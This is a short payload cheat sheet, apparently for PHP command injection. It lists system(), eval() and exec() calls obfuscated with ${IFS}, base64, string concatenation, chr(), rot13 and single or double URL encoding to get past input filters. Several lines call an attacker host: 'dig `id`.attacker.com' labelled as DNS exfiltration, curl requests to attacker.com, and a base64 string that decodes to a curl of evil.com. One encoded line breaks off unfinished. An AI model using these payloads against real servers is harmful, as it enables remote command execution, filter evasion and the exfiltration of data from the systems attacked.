
```php
// ==== SYSTEM ====
system("bash${IFS}-c${IFS}id");
system("$(echo aWQ=|base64 -d)");
system('i'.'d');
```
# URL-encode:
```
%73%79%73%74%65%6D%28%27%69%64%27%29
```
# Double-encode:
```
%2573%2579%2573%2574%2565%256D%2528%2527%2569%2564%2527%2529
system("dig `id`.attacker.com");     // DNS exfil
```
# URL-encode DNS:
```
dig%20%60id%60.attacker.com
```
// ==== EVAL ====
```html
eval('1/*x*/+1');
eval("1${IFS}+${IFS}1");
eval("$(echo MTsx|base64 -d)");      // MTsx = "1+1"
```
# URL-encode:
```html
eval%28%271%2B1%27%29
```
# Double-encode:
```html
%2565%2561%256C%2565%2528%2527%2531%252B%2531%2527%2529
eval(chr(49).chr(43).chr(49));
eval(str_rot13('1+1'));
```
// ==== EXEC ====
```html
exec('c'.'u'.'r'.'l http://attacker.com');
exec("${IFS}curl${IFS}http://attacker.com");
exec("$(echo Y3VybCBodHRwOi8vZXZpbC5jb20=|base64 -d)");
```
# URL-encode:
```
exec%28%27curl%20http%3A%2F%2Fattacker.com%27%29
```
# Double-encode:
```html
%2565%2563%2565%2563%2538%2528%2527%2538...
exec("dig $(curl http://attacker.com).attacker-dns.com");  // DNS exfil + mix
```
